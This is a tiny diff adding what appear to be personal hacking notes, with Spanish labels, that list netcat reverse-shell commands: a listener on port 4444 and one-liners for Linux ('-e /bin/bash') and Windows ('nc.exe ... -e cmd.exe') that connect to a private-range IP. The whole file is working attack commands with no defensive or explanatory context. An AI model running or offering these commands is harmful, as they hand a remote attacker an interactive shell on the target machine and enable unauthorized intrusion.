@@ -1,0 +1,8 @@
+nc -lvp 4444
+
+en linux:
+ nc -nv 192.168.19.146 4444 -e /bin/bash
+
+
+en windows:
+nc.exe 192.168.19.147 4444 -e cmd.exe
